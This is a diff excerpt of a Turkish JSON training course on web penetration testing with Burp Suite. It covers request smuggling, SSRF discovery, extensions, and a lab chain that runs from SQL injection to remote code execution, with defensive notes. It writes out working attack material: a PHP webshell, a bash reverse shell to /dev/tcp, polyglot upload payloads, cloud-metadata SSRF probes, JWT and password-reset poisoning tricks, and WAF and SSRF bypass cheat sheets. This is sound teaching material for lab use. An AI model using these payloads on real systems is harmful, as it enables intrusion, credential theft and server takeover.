+              "description": "Grep Extract — yanıttan dinamik veri çek (CSRF token, balance, flag). Grep Match — başarı/hata filtreleme.",
+              "tip": "Çok sayıda istek arasında 'Welcome' veya 'Invalid''a göre filtrele: Results > sütun başlığına tıkla."
+            },
+            {
+              "command": "# Turbo Intruder (BApp Store'dan kur):\n# Extender > BApp Store > Turbo Intruder > Install\n# İstek > Sağ tık > Extensions > Send to Turbo Intruder\n\n# Basit örnek script:\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30)\n    for word in open('/usr/share/wordlists/rockyou.txt'):\n        engine.queue(target.req, word.rstrip())\n\ndef handleResponse(req, interesting):\n    if '200' in req.status:\n        table.add(req)",
+              "description": "Turbo Intruder — Python scriptli, Community'deki hız kısıtını aşan, asenkron istek motoru. Race condition saldırıları için de idealdir.",
+              "tip": "Turbo Intruder'da 'examples/race.py' hazır race condition script'i içeriyor — aynı anda 20 istek göndererek race condition'ları test eder."
+            }
+          ]
+        },
+        {
+          "id": "param-miner",
+          "type": "commands",
+          "title": "Param Miner — Gizli Parametreleri Keşfet",
+          "commands": [
+            {
+              "command": "# BApp Store > Param Miner > Install\n# İstek > Sağ tık > Extensions > Guess parameters\n\n# Param Miner ne yapar:\n# - Binlerce gizli parametre adını arka planda dener\n# - debug=true, test=1, admin=true, verbose=1 gibi\n# - Yanıt farklılaşan parametreleri raporlar\n\n# Sonuçları gör:\n# Extender > Output sekmesinde",
+              "description": "Param Miner — /search?q=test isteğine gizli debug=true, admin=1, cache=false gibi parametreler ekler. Yanıt değişirse parametre sunucu tarafında işleniyor demektir.",
+              "output": "# Param Miner buluyor:\n# [+] Found parameter: debug → enables stack trace\n# [+] Found parameter: preview → shows unpublished content\n# [+] Found parameter: admin → changes navigation menu"
+            },
+            {
+              "command": "# Gizli parametre bulununca Repeater'da test et:\nGET /search?q=test&debug=true HTTP/1.1\n\n# Yanıt:\n# <div class='debug-info'>\n#   SQL: SELECT * FROM products WHERE name LIKE '%test%'\n#   User: anonymous (id=0)\n#   Cache: MISS\n#   Server: internal-app-server-03.corp.local\n# </div>",
+              "description": "debug=true gibi parametreler sunucu iç bilgilerini (SQL sorguları, dahili hostlar, hata stack trace) ifşa edebilir.",
+              "tip": "Web Cache Poisoning için Param Miner çok değerlidir — cache'in kabul ettiği ama yanıtta yansıyan header/parametre kombinasyonlarını otomatik bulur."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "request-smuggling-ssrf",
+      "title": "Request Smuggling & SSRF — İleri Seviye HTTP Saldırıları",
+      "description": "HTTP/1.1 Content-Length ile Transfer-Encoding çakışmasından doğan Request Smuggling temelleri ve Burp ile SSRF keşfi.",
+      "difficulty": "advanced",
+      "duration": "55 dk",
+      "sections": [
+        {
+          "id": "smuggling-theory",
+          "type": "theory",
+          "title": "HTTP Request Smuggling Neden Çalışır?",
+          "content": "Modern web mimarilerinde istekler genellikle iki sunucudan geçer: **Frontend (load balancer/proxy)** → **Backend**. İki sunucu aynı HTTP isteğinin nerede bittiğine farklı karar verirse — ortada 'kaçakçılık' yapılabilir.\n\n**İki boyut kuralı:**\n- `Content-Length (CL)`: body kaç byte uzun?\n- `Transfer-Encoding: chunked (TE)`: chunk bloklarıyla gönder, son chunk 0 ile biter\n\n**Saldırı türleri:**\n```\nCL.TE: Frontend CL'e güvenir, Backend TE'ye\n       → Frontend bir istek görür, Backend iki istek\n\nTE.CL: Frontend TE'ye güvenir, Backend CL'e  \n       → Benzer çakışma, ters yönde\n\nTE.TE: Her ikisi de TE'ye güvenir ama farklı parse eder\n       → Transfer-Encoding header'ını gizle/karıştır\n```\n\n**Etki:** Başka kullanıcıların isteklerini 'ele geçirme', yetki bypass, cache poisoning, iç servislere erişim.\n\n**Araç:** Burp Suite Pro'da 'HTTP Request Smuggler' extension en iyi araç. Community'de manuel test gerekir."
+        },
+        {
+          "id": "smuggling-komutlar",
+          "type": "commands",
+          "title": "CL.TE Smuggling — Temel Teknik",
+          "commands": [
+            {
+              "command": "# HTTP Request Smuggler extension kur (BApp Store)\n# İstek > Sağ tık > Extensions > HTTP Request Smuggler > Launch\n# Otomatik CL.TE, TE.CL, TE.TE taraması yapar\n\n# Manuel CL.TE testi:\nPOST / HTTP/1.1\nHost: hedef.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED",
+              "description": "CL.TE testi — frontend CL'e (13 byte) güveniyor ve tüm isteği backend'e iletir. Backend TE'ye güveniyor: 0\\r\\n (son chunk) görünce isteğin bittiğini düşünür, 'SMUGGLED' kısmı sonraki isteğin başı olarak kalır.",
+              "warning": "Request smuggling saldırıları diğer kullanıcıları etkileyebilir — sadece izolasyon garantisi olan lab ortamında (PortSwigger Academy) uygula.",
+              "tip": "HTTP/2 üzerinden da smuggling mümkün (H2.CL, H2.TE). PortSwigger Academy'de HTTP/2 ile özel lab'lar var."
+            },
+            {
+              "command": "# Timeout tabanlı tespit:\n# 1. Normal istek ne kadar sürer? → 100ms\n# 2. Bu isteği gönder ve süreyi ölç:\n\nPOST / HTTP/1.1\nHost: hedef.com\nTransfer-Encoding: chunked\nContent-Length: 4\n\n1\nA\n\n# Frontend TE kullanırsa 1\\r\\nA\\r\\n tam chunk → backend'e ilet → normal yanıt hızlı gelir\n# Frontend CL kullanırsa (CL=4: '1\\r\\nA') → backend TE bekler → 10+ sn timeout → VULNERABLe!",
+              "description": "Timeout tekniği — hangi protokolü kimin kullandığını belirler. 10 saniye bekleme varsa smuggling mümkündür.",
+              "tip": "Burp > Repeater > Request timeout değerini 10 sn'ye düşür — uzun bekleme zaman aşımı değil, zafiyet işareti."
+            }
+          ]
+        },
+        {
+          "id": "ssrf-burp",
+          "type": "commands",
+          "title": "SSRF Tespiti — Collaborator ile Out-of-Band",
+          "commands": [
+            {
+              "command": "# Burp Collaborator adresi al:\n# Burp > Collaborator > Copy to clipboard\n# Örnek: abcdef1234.burpcollaborator.net\n\n# SSRF'e açık olabilecek parametrelere bu URL'i gir:\nGET /fetch?url=http://abcdef1234.burpcollaborator.net HTTP/1.1\nGET /proxy?target=http://abcdef1234.burpcollaborator.net HTTP/1.1\nGET /redirect?to=http://abcdef1234.burpcollaborator.net HTTP/1.1\n\n# Header'lara da ekle:\nX-Forwarded-Host: abcdef1234.burpcollaborator.net\nReferer: http://abcdef1234.burpcollaborator.net\n\n# Collaborator > Poll now → DNS/HTTP hit geldi mi?",
+              "description": "Out-of-band SSRF tespiti — Collaborator URL'i her parametre ve header'a gönder, sunucu bizim sunucumuza bağlanırsa SSRF var.",
+              "output": "# Collaborator panel:\n# DNS query from: 54.240.196.186 (AWS IP!)\n# HTTP request: GET / HTTP/1.1 from: 10.0.0.15 (internal IP)\n# → SSRF confirmed! Sunucu internal ağdan bağlanıyor"
+            },
+            {
+              "command": "# SSRF ile iç ağ keşfi:\n# AWS Metadata:\nGET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\n\n# GCP Metadata:\nGET /fetch?url=http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1\nMetadata-Flavor: Google  # (bu header gerekebilir)\n\n# Azure Metadata:\nGET /fetch?url=http://169.254.169.254/metadata/instance HTTP/1.1\nMetadata: true\n\n# İç servis keşfi:\nGET /fetch?url=http://127.0.0.1:6379/  → Redis?\nGET /fetch?url=http://127.0.0.1:9200/  → Elasticsearch?\nGET /fetch?url=http://127.0.0.1:8500/  → Consul?\nGET /fetch?url=http://192.168.1.1:80/  → İç ağ?",
+              "description": "SSRF doğrulanınca metadata endpoint'leri ve iç ağ portları tara — cloud credential'ları, iç API'ler, DB sunucuları.",
+              "tip": "http://127.0.0.1 engelleniyorsa: http://0.0.0.0, http://[::1] (IPv6), http://localhost, http://0177.0.0.01 (octal) bypass dene."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "extensions-workflow",
+      "title": "Kritik Extension'lar ve Pro Workflow",
+      "description": "Burp'ü gerçek saha aracına dönüştüren 7 kritik extension: Autorize, Logger++, Active Scan++, Turbo Intruder, Param Miner, JWT Editor, Upload Scanner.",
+      "difficulty": "intermediate",
+      "duration": "40 dk",
+      "sections": [
+        {
+          "id": "extension-listesi",
+          "type": "theory",
+          "title": "7 Olmazsa Olmaz Burp Extension",
+          "content": "**BApp Store'dan kurulum:** Extender > BApp Store\n\n| Extension | Kullanım | Neden Kritik? |\n|-----------|----------|---------------|\n| **Autorize** | IDOR / Broken Access Control | Yüksek yetkili oturumla tüm istekleri düşük yetkiyle tekrar dener, farklılıkları işaretler |\n| **Logger++** | Gelişmiş trafik kaydı | HTTP History'nin yetersiz kaldığı karmaşık uygulamalar, regex filtre, renk kodlama |\n| **Param Miner** | Gizli parametre keşfi | Cache poisoning, hidden debug param, web cache deception |\n| **JWT Editor** | JWT analiz ve saldırı | alg:none, RS256→HS256, kid injection |\n| **Turbo Intruder** | Yüksek hızlı fuzzing | Race condition, Community hız bypass |\n| **Upload Scanner** | Dosya yükleme bypass | MIME type, extension, polglot payload testi |\n| **Active Scan++** | Aktif tarama genişletme | Log4Shell, SQLi varyantları, template injection |\n| **HTTP Request Smuggler** | CL.TE / TE.CL tespiti | Otomatik smuggling tarama |\n| **Hackvertor** | Çok katmanlı encode/decode | WAF bypass için iç içe encode |"
+        },
+        {
+          "id": "autorize-workflow",
+          "type": "commands",
+          "title": "Autorize ile Otomatik IDOR/Access Control Testi",
+          "commands": [
+            {
+              "command": "# 1. İki hesapla giriş yap:\n#    - admin@hedef.com → Cookie_A: session=ADMIN_TOKEN\n#    - user@hedef.com  → Cookie_B: session=USER_TOKEN\n\n# 2. Autorize sekmesini aç\n# 3. 'Intercept is on' kısmına USER_TOKEN'ı yapıştır\n\n# 4. Admin hesabıyla her sayfayı gez\n# Autorize her isteği otomatik USER_TOKEN ile de tekrar dener\n\n# 5. Renk kodları:\n# 🟢 Yeşil: Her iki token → farklı yanıt (erişim kontrolü çalışıyor)\n# 🔴 Kırmızı: Her iki token → aynı yanıt (IDOR / access control broken!)\n# 🟡 Sarı: Manuel inceleme gerekiyor",
+              "description": "Autorize — 2 hesapla saniyeler içinde uygulama genelinde IDOR taraması yap. Admin sayfalarının düşük yetkiyle de açılıp açılmadığını otomatik kontrol eder.",
+              "output": "# Autorize sonuçları:\n# GET /api/user/profile  → 🟢 Bypassed? No\n# GET /api/admin/users   → 🔴 Bypassed? Yes! (USER token ile 200 döndü)\n# DELETE /api/user/1     → 🔴 Bypassed? Yes!\n# GET /api/invoice/1042  → 🔴 Bypassed? Yes! (Başka kullanıcının faturası)"
+            },
+            {
+              "command": "# Upload Scanner ile dosya yükleme bypass:\n# Extensions > Upload Scanner > yapılandır\n# Dosya yükleme endpoint'ine istek gönder\n# Otomatik olarak dener:\n# - PHP webshell: shell.php, shell.php.jpg, shell.pHp, shell.php%00.jpg\n# - MIME type: image/jpeg içinde <?php system($_GET['cmd']); ?>\n# - SVG XSS: <svg onload='alert(1)'>\n# - Polglot: aynı anda geçerli JPG VE geçerli PHP\n\n# Manuel kontrol:\n# Content-Type: image/jpeg değiştirmeden extension: .php\n# Content-Type: application/php değiştirmeden extension: .jpg\n# Double extension: shell.jpg.php → bazen son extension bakılır",
+              "description": "Upload Scanner — dosya yükleme endpoint'lerinde onlarca bypass yöntemini otomatik dener.",
+              "tip": "Polglot payload için: exiftool -Comment='<?php system($_GET[cmd]); ?>' image.jpg — JPG olarak geçerli ama PHP olarak da çalışır."
+            }
+          ]
+        },
+        {
+          "id": "decoder-comparer",
+          "type": "commands",
+          "title": "Decoder & Comparer — Veriyi Çöz, Farkı Gör",
+          "commands": [
+            {
+              "command": "# Decoder — zincirlenmiş decode:\n# URL encoded + Base64 içiçe:\n# %62%61%73%65%36%34%5f%74%6f%6b%65%6e\n# Adım 1: URL decode → base64_token\n# Adım 2: Base64 decode → {\"user\":\"admin\",\"role\":\"user\"}\n\n# Keyboard shortcuts:\n# Ctrl+B → Base64 decode\n# Ctrl+Shift+B → Base64 encode\n# Ctrl+U → URL decode\n# Ctrl+Shift+U → URL encode\n# Ctrl+H → HTML decode\n\n# Hash hesaplama:\n# Decoder > Smart decode → MD5/SHA otomatik tanır\n# Manuel: Input → Hash MD5/SHA1/SHA256",
+              "description": "Decoder — iç içe encode'ları katman katman çöz. Token analizinde, WAF bypass'ta, payload encode'unda kritik.",
+              "tip": "Smart decode düğmesi en üstte — birden fazla encode katmanını otomatik tanıyıp çözer."
+            },
+            {
+              "command": "# Comparer — iki yanıtı karşılaştır:\n# Kullanım 1: IDOR testi\n# Kullanıcı A'nın profil yanıtı → Send to Comparer\n# Kullanıcı B'nin profil yanıtı → Send to Comparer\n# Words veya Bytes düğmesi → farkları highlight eder\n\n# Kullanım 2: Blind SQLi onayı\n# ' AND 1=1-- yanıtı + ' AND 1=2-- yanıtı\n# Farklıysa → Boolean-based SQLi var!\n\n# Kullanım 3: Timing saldırısı\n# Normal yanıt süresi vs saldırı payload yanıt süresi\n# Süre farkı > 5sn → Time-based blind SQLi",
+              "description": "Comparer — iki HTTP yanıtı arasındaki farkı kelime veya byte düzeyinde göster. Boolean blind SQLi, IDOR, authz testi için kritik.",
+              "tip": "HTTP History'de birden fazla satır seç → sağ tık → Send all to Comparer → sırayla karşılaştır."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "tam-web-pentest-lab",
+      "title": "Tam Web Pentest Lab — Burp ile Baştan Sona",
+      "description": "Gerçek bir CTF/lab senaryosu: keşiften admin shell'e kadar Burp Suite'i tek araç olarak kullanan eksiksiz saldırı zinciri.",
+      "difficulty": "advanced",
+      "duration": "90 dk",
+      "sections": [
+        {
+          "id": "pentest-workflow",
+          "type": "theory",
+          "title": "Burp ile Sistematik Web Pentest Akışı",
+          "content": "**Faz 1 — Keşif (Passive)**\n- Spider ile tüm sayfaları tara (Target > Site Map > Spider)\n- HTTP History'de tüm endpoint'leri derle\n- JavaScript dosyalarını oku — gizli API endpoint'leri, secret key'ler\n- Param Miner ile her sayfada gizli parametre tara\n\n**Faz 2 — Haritalama**\n- Target > Site Map'te tüm URL'leri gör\n- Farklı HTTP metodlarını dene (GET→POST→DELETE)\n- Kimlik doğrulama mekanizmasını tespit et: Cookie? JWT? API Key? Basic Auth?\n- Hata mesajlarını topla — framework, DB, stack bilgisi\n\n**Faz 3 — Fonksiyon Bazlı Test**\n- Giriş: brute force, bypass, default creds\n- Profil/hesap: IDOR, parametre manipülasyonu\n- Arama/filtre: SQLi, XSS, SSTI\n- Dosya yükleme: extension bypass, webshell\n- Ödeme/miktar: negatif değer, business logic\n- Yönetim paneli: yetki bypass, header injection\n\n**Faz 4 — Exploit & Doğrulama**\n- Repeater: zafiyeti tekrar tekrar doğrula\n- Screenshot + istek/yanıt kaydet (rapor için)\n- Etki ölçümü: sadece zafiyet tespiti değil, ne kadar ilerlenebilir?\n\n**Burp'te Hız Kısayolları:**\n| Kısayol | Eylem |\n|---------|-------|\n| Ctrl+R | Repeater'a gönder |\n| Ctrl+I | Intruder'a gönder |\n| Ctrl+D | Dashboard |\n| Ctrl+Shift+H | HTTP History |\n| F | Forward (Intercept) |\n| A | Action menüsü (Intercept) |"
+        },
+        {
+          "id": "full-lab",
+          "type": "lab",
+          "title": "Lab: PortSwigger Academy — Tam Zincir",
+          "scenario": {
+            "title": "Web Pentest Zinciri: SQL Injection → Admin Panel → File Upload → RCE",
+            "objective": "Burp Suite'i kullanarak hedef uygulamada SQLi ile admin credential'larını çıkar, admin paneline gir, dosya yükle ve webshell ile RCE elde et.",
+            "environment": "PortSwigger Web Security Academy (ücretsiz) — şu lab'lar sırayla: 1) 'SQL injection UNION attack, retrieving data from other tables' 2) 'File upload - web shell upload via Content-Type restriction bypass' | Alternatif: DVWA (Docker: vulnerables/web-dvwa) | TryHackMe: 'OWASP Top 10 2021' room",
+            "difficulty": "advanced",
+            "steps": [
+              "FoxyProxy ile Burp'ü tarayıcıya bağla, CA sertifikasını kur",
+              "Hedef uygulamayı Burp Spider ile tara: Target > Site Map > Spider this host",
+              "HTTP History'de POST /login isteğini bul, Repeater'a gönder",
+              "Username alanını SQLi ile test et: admin'-- ve ' OR 1=1-- dene",
+              "SQLi onaylanırsa UNION saldırısı: ' UNION SELECT username,password FROM users--",
+              "Admin hash'ini Decoder ile analiz et (MD5 ise hashcat -m 0 ile kır)",
+              "Admin credential'larıyla /admin paneline giriş yap",
+              "Dosya yükleme alanını bul, normal bir JPG yükle ve isteği yakala",
+              "Content-Type: image/jpeg bırak ama dosya adını shell.php yap",
+              "<?php system($_GET['cmd']); ?> içerikli dosya yükle",
+              "Yüklenen dosyanın URL'ine git: /uploads/shell.php?cmd=id",
+              "Reverse shell al: cmd=bash -c 'bash -i >& /dev/tcp/KALI/4444 0>&1'",
+              "LinPEAS ile PrivEsc ara"
+            ],
+            "hints": [
+              "SQLi UNION için önce kolon sayısını bul: ' ORDER BY 1-- sonra ORDER BY 2-- devam et, hata alınca dur",
+              "UNION SELECT NULL,NULL-- ile boş değerlerle başla, sonra string sütunları bul",
+              "Dosya yükleme bypass: Content-Type'ı image/jpeg bırakıp extension'ı .php yap — backend sadece MIME type'a bakıyorsa geçer",
+              "Webshell çalışmıyorsa .phtml, .php5, .phar extension'larını dene",
+              "Reverse shell için nc -lvnp 4444 dinle, URL encode et: %26 yerine &"
+            ],
+            "flag": "Lab'a göre değişir — PortSwigger'da 'Lab solved' onayı, DVWA'da /etc/passwd okuma",
+            "defenseNote": "SQLi: Prepared statement. Dosya yükleme: yükleme dizinini web root dışında tut, PHP execution'ı uploads klasöründe devre dışı bırak (php_flag engine off), sadece whitelist extension kabul et, içeriği magic bytes ile doğrula. Content-Type header'a asla güvenme — server-side doğrulama şart."
+          }
+        },
+        {
+          "id": "burp-cheatsheet",
+          "type": "advanced",
+          "title": "Burp Suite Hızlı Referans — Saha Notları",
+          "content": "### Header Manipulation Cheatsheet\n```\n# IP bypass\nX-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1\nClient-IP: 127.0.0.1\nX-Remote-IP: 192.168.1.1\nTrue-Client-IP: 10.0.0.1\n\n# Path bypass\nX-Original-URL: /admin\nX-Rewrite-URL: /admin\nX-Custom-IP-Authorization: 127.0.0.1\n\n# Password reset poisoning\nHost: attacker.com\nX-Forwarded-Host: attacker.com\n\n# Cache poisoning\nX-Host: cached-for-all.com\n```\n\n### JWT Quick Attacks\n```\n# alg:none → imzayı sil, son nokta bırak\neyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.\n\n# Brute force\nhashcat -m 16500 token.jwt rockyou.txt\n\n# Public key discovery\ncurl /.well-known/jwks.json\ncurl /api/auth/keys\n```\n\n### HTTP Method Tampering\n```\nGET → POST → PUT → DELETE → HEAD → OPTIONS → TRACE\nX-HTTP-Method: DELETE\nX-HTTP-Method-Override: DELETE\nX-Method-Override: DELETE\n```\n\n### SSRF Bypass\n```\n# Kara liste atlatma:\n127.0.0.1  → 0.0.0.0 | 127.1 | 0x7f000001 | 0177.0.0.1\nlocalhost  → LOCALHOST | lOcAlHoSt\nhttp://    → https:// | dict:// | ftp:// | file://\n```\n\n### Encoding Zinciri (WAF bypass)\n```\n../  → %2e%2e%2f  →  %252e%252e%252f (double)\n<    → %3c        →  &lt;  →  &#60;  →  \\u003c\nSELECT → SeLeCt | S%45LECT | SE/**/LECT\n```"
         }
       ]
     }
